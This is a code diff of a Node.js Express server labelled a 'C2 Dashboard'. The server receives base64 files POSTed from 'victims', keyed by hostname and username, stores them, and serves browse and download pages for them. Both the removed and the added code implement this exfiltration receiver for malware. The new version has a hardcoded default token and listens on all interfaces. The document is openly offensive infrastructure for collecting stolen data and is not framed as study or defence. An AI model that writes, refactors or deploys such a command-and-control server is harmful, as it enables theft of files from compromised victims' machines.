@@ -3,184 +3,120 @@ const fsSync = require('fs');
 const path = require('path');
 const express = require('express');
 const cors = require('cors');
-const { loadConfig } = require('./lib/config');
 
 const app = express();
-const config = loadConfig();
 
 app.use(cors());
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '100mb' }));
 
-const VICTIMS_DIR = process.env.RAILWAY_ENVIRONMENT
-    ? '/tmp/victims'
-    : path.join(__dirname, 'victims');
+const VICTIMS_DIR = path.join(__dirname, 'victims');
+const SECRET_TOKEN = process.env.SECRET_TOKEN || 'qutmess';
 
-const SECRET_TOKEN = config.secretToken;
-
-(async () => {
-    try {
-        if (!fsSync.existsSync(VICTIMS_DIR)) {
-            fsSync.mkdirSync(VICTIMS_DIR, { recursive: true });
-        }
-        console.log(`Victims storage: ${VICTIMS_DIR}`);
-        console.log(`Public URL (from config): ${config.publicUrl}`);
-    } catch (err) {
-        console.error('Failed to create victims folder:', err);
-        process.exit(1);
-    }
-})();
-
-function victimRootResolved(safeId) {
-    return path.resolve(path.join(VICTIMS_DIR, path.basename(safeId)));
+if (!fsSync.existsSync(VICTIMS_DIR)) {
+    fsSync.mkdirSync(VICTIMS_DIR, { recursive: true });
 }
+console.log('Victims folder:', VICTIMS_DIR);
 
-async function listVictimDirs() {
-    const victims = await fs.readdir(VICTIMS_DIR);
-    const dirs = [];
-    for (const v of victims) {
-        const stat = await fs.stat(path.join(VICTIMS_DIR, v));
-        if (stat.isDirectory()) {
-            dirs.push(v);
-        }
-    }
-    return dirs;
-}
-
-app.get('/api/health', (req, res) => {
-    res.json({ ok: true, publicUrl: config.publicUrl });
-});
-
-app.get('/api/victims', async (req, res) => {
+app.get('/', async (req, res) => {
     try {
-        const victims = await listVictimDirs();
-        res.json({ victims });
+        const items = await fs.readdir(VICTIMS_DIR);
+        const victims = [];
+        for (const item of items) {
+            const stat = await fs.stat(path.join(VICTIMS_DIR, item));
+            if (stat.isDirectory()) victims.push(item);
+        }
+        res.send('<h2>C2 Dashboard — ' + victims.length + ' victims</h2><ul>' + 
+            victims.map(v => '<li><a href="/victim/' + v + '">' + v + '</a></li>').join('') + 
+            '</ul>');
     } catch (err) {
         console.error(err);
-        res.status(500).json({ error: 'Failed to list victims' });
+        res.status(500).send('Internal Server Error');
     }
 });
 
-async function handleSend(req, res) {
+app.post('/send', async (req, res) => {
     try {
-        const { hostname, username, token, file, filename, content } = req.body;
-        if (token !== SECRET_TOKEN) {
-            return res.status(403).json({ error: 'Unauthorized' });
-        }
-        if (!file && !content) {
-            return res.status(400).json({ error: 'No file provided' });
-        }
+        const { hostname, username, token, filename, content } = req.body;
+        if (token !== SECRET_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
+        if (!hostname || !username) return res.status(400).json({ error: 'Missing hostname or username' });
+        if (!content) return res.status(400).json({ error: 'No content provided' });
 
-        const safeFolder = path.basename(`${hostname}_${username}`);
-        const victimDir = path.join(VICTIMS_DIR, safeFolder);
-        const safeFilename =
-            filename ||
-            (file && file.name ? path.basename(file.name) : null) ||
-            'upload.bin';
+        const safeName = (hostname + '_' + username).replace(/[^a-zA-Z0-9_-]/g, '_');
+        const victimDir = path.join(VICTIMS_DIR, safeName);
+        const safeFilename = (filename || 'data.txt').replace(/[^a-zA-Z0-9._-]/g, '_');
         const filePath = path.join(victimDir, safeFilename);
-        let savedName = safeFilename;
 
-        try {
-            await fs.mkdir(victimDir, { recursive: true });
-            if (content) {
-                await fs.writeFile(filePath, content, 'base64');
-            } else if (file && file.path) {
-                await fs.copyFile(file.path, filePath);
-            } else if (file && file.content) {
-                savedName = file.name ? path.basename(file.name) : safeFilename;
-                await fs.writeFile(path.join(victimDir, savedName), file.content, 'base64');
-            } else {
-                return res.status(400).json({ error: 'No file provided' });
-            }
-            console.log(`[+] ${safeFolder} — saved ${savedName}`);
-            res.json({ success: true });
-        } catch (err) {
-            console.error('Failed to save file:', err);
-            res.status(500).json({ error: 'Write failed' });
-        }
+        await fs.mkdir(victimDir, { recursive: true });
+        await fs.writeFile(filePath, content, 'base64');
+        console.log('[+]', safeName, '— saved', safeFilename);
+        res.json({ success: true });
     } catch (err) {
-        console.error('Failed to process request:', err);
-        res.status(500).send('Internal Server Error');
-    }
-}
-
-app.post('/send', handleSend);
-app.post('/api/send', handleSend);
-
-app.get(/^\/victim\/([^/]+)\/(.+)/, async (req, res) => {
-    try {
-        const safeId = path.basename(req.params[0]);
-        const subPath = req.params[1].replace(/\\/g, '/');
-        if (subPath.includes('..')) {
-            return res.status(400).send('Invalid path');
-        }
-
-        const victimDir = victimRootResolved(safeId);
-        const fullPath = path.resolve(path.join(victimDir, subPath));
-
-        if (!fullPath.startsWith(victimDir)) {
-            return res.status(403).send('Forbidden');
-        }
-
-        try {
-            const stats = await fs.stat(fullPath);
-            if (stats.isDirectory()) {
-                const files = await fs.readdir(fullPath);
-                const backLink = subPath
-                    ? `/victim/${safeId}/${path.dirname(subPath).replace(/\\/g, '/')}`
-                    : `/victim/${safeId}`;
-                res.send(
-                    `<h2>Folder: ${subPath || safeId}</h2><a href="${backLink}">⬅ Back</a><ul>${files
-                        .map((f) => {
-                            const itemPath = subPath ? `${subPath}/${f}` : f;
-                            const itemFullPath = path.join(fullPath, f);
-                            const isDir = fsSync.statSync(itemFullPath).isDirectory();
-                            return `<li><a href="/victim/${safeId}/${itemPath.replace(/\\/g, '/')}${
-                                isDir ? '/' : ''
-                            }">${f}</a></li>`;
-                        })
-                        .join('')}</ul>`
-                );
-                return;
-            }
-        } catch (err) {
-            /* fall through to download */
-        }
-
-        res.download(fullPath);
-    } catch (err) {
-        console.error('Failed to process request:', err);
-        res.status(500).send('Internal Server Error');
+        console.error(err);
+        res.status(500).json({ error: 'Server error' });
     }
 });
 
 app.get('/victim/:id', async (req, res) => {
     try {
-        const safeId = path.basename(req.params.id);
-        const victimDir = victimRootResolved(safeId);
-
-        let files;
-        try {
-            files = await fs.readdir(victimDir);
-        } catch (err) {
-            console.error('Failed to read victim folder:', err);
-            return res.status(404).send('Not found');
-        }
-
-        res.send(
-            `<h2>Victim: ${safeId}</h2><ul>${files
-                .map(
-                    (f) =>
-                        `<li><a href="/victim/${safeId}/${f.replace(/\\/g, '/')}">${f}</a></li>`
-                )
-                .join('')}</ul>`
-        );
+        const victimId = req.params.id.replace(/[^a-zA-Z0-9_-]/g, '_');
+        const victimDir = path.join(VICTIMS_DIR, victimId);
+        if (!fsSync.existsSync(victimDir)) return res.status(404).send('Not found');
+        const files = await fs.readdir(victimDir, { withFileTypes: true });
+        let html = '<h2>Victim: ' + victimId + '</h2><a href="/">⬅ Back</a><ul>';
+        files.forEach(f => {
+            if (f.isDirectory()) html += '<li><a href="/victim/' + victimId + '/' + f.name + '/">' + f.name + '/</a></li>';
+            else html += '<li><a href="/download/' + victimId + '/' + f.name + '">' + f.name + '</a></li>';
+        });
+        res.send(html + '</ul>');
     } catch (err) {
-        console.error('Failed to process request:', err);
+        console.error(err);
         res.status(500).send('Internal Server Error');
     }
 });
 
-app.use(express.static(path.join(__dirname, 'public')));
+app.get('/victim/:id/:subpath(*)', async (req, res) => {
+    try {
+        const victimId = req.params.id.replace(/[^a-zA-Z0-9_-]/g, '_');
+        const subPath = req.params.subpath.replace(/[^a-zA-Z0-9_/-]/g, '');
+        const fullPath = path.join(VICTIMS_DIR, victimId, subPath);
+        if (!fsSync.existsSync(fullPath)) return res.status(404).send('Not found');
+        const stats = await fs.stat(fullPath);
+        if (stats.isDirectory()) {
+            const files = await fs.readdir(fullPath, { withFileTypes: true });
+            const parentPath = path.dirname(subPath).replace(/\\/g, '/');
+            const backLink = parentPath === '.' ? '/victim/' + victimId : '/victim/' + victimId + '/' + parentPath + '/';
+            let html = '<h2>Folder: ' + subPath + '</h2><a href="' + backLink + '">⬅ Back</a><ul>';
+            files.forEach(f => {
+                if (f.isDirectory()) html += '<li><a href="/victim/' + victimId + '/' + subPath + '/' + f.name + '/">' + f.name + '/</a></li>';
+                else html += '<li><a href="/download/' + victimId + '/' + subPath + '/' + f.name + '">' + f.name + '</a></li>';
+            });
+            res.send(html + '</ul>');
+        } else {
+            res.sendFile(fullPath);
+        }
+    } catch (err) {
+        console.error(err);
+        res.status(500).send('Internal Server Error');
+    }
+});
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Listening on port ${PORT}`));
+app.get('/download/:id/:filename(*)', async (req, res) => {
+    try {
+        const victimId = req.params.id.replace(/[^a-zA-Z0-9_-]/g, '_');
+        const filename = req.params.filename.replace(/[^a-zA-Z0-9._-]/g, '_');
+        const filePath = path.join(VICTIMS_DIR, victimId, filename);
+        if (!fsSync.existsSync(filePath)) return res.status(404).send('Not found');
+        res.download(filePath);
+    } catch (err) {
+        console.error(err);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+const PORT = Number(process.env.PORT) || 3000; // Railway sets PORT
+const HOST = process.env.HOST || '0.0.0.0'; // 0.0.0.0 = listen on all interfaces
+
+app.listen(PORT, HOST, () => {
+    const displayHost = HOST === '0.0.0.0' ? 'all interfaces' : HOST;
+    console.log('C2 listening on ' + displayHost + ':' + PORT + ' (POST /send); clients: C2_SEND_URL + /send, C2_SECRET_TOKEN');
+});
